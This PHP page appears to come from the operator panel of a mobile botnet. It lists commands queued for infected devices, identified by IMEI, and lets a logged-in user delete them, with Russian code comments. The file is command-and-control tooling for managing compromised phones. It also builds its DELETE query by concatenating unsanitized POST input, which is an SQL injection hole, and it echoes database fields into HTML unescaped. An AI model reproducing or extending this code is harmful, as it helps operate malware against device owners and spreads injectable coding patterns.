<?php
$statusCode=false;
if (!(isset($_SESSION['panel_user'])))
{
	session_destroy();
	header("Location: /login.php");
}else{
	
	if ($_SESSION['panel_status']!="Action"){
		session_destroy();
		header("Location: /login.php");
	}
	
	if (($_SESSION['panel_right']!="admin")&&($_SESSION['panel_right']!="user")){
		header("Location: /index.php");
	}else{
		$statusCode=true;
	}
}
if($statusCode){
?>

<div class="content">

<script type="text/javascript">
    function checkAll(checkId){
        var inputs = document.getElementsByTagName("input");
        for (var i = 0; i < inputs.length; i++) { 
            if (inputs[i].type == "checkbox" && inputs[i].id == checkId) { 
                if(inputs[i].checked == true) {
                    inputs[i].checked = false ;
                } else if (inputs[i].checked == false ) {
                    inputs[i].checked = true ;
                }
            }  
        }  
    }
</script>

 <table class="table table-hover table_dark" id="bootstrap-table">
 <thead class="header_table_bots">
	    <th><input type="checkbox" id="chk_new"  onclick="checkAll('chk');" /></th>
		<th>ID</th>
		<th>ID Bots</th>	
		<th>Command</th>
  </thead>
	
	<?php
	//	include 'config.php';
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');
        $sql = "SELECT * FROM commands";
		$booleanIMEI = false;

		//*****Обработка запросa Для удаления!
		if((isset($_POST["delete"])) && (isset($_POST["checks"])))
		{
			if (preg_match("/checks/",print_r($_POST,true))) 
			{
				foreach($_POST["checks"] as $id)
				{
					$id_del = $id; 
					$sql2 = "DELETE FROM commands WHERE id='".$id_del."'";
					$connection->query($sql2);
				}
			}
				header ('Location: /index.php?cont=commands');
		}
		
		//******батоны и переменые с базы!********
	    echo "<form method='post'>";
		echo "<p id='text_command' style='margin-top:5px; Color:#EDB749;  font-size: 13pt;'>Сommands in the queue</p>";
		echo "<input type='submit' value='Delete' name='delete' style='margin-left:68px; margin-top:15px;' class='btn btn-outline-danger'/>";
		
		
		foreach($connection->query($sql) as $row)
		{
			$ID = $row['id'];
			$IMEI = $row['IMEI'];
			$command = $row['command'];

			//************Данные в таблице********************************************
			echo "<tr class='table_bots' style='color: #A4A4A4'>
				<td><input type=checkbox id='chk' name=checks[] value=$ID></input></td>
				<td>$ID</td>
				<td>$IMEI</td>
				<td>$command</td>
				</tr>";
		}
		 echo "</form>";

		//	id 	IMEI 	command 	
		?>

</table>
</div>
<?php } ?>
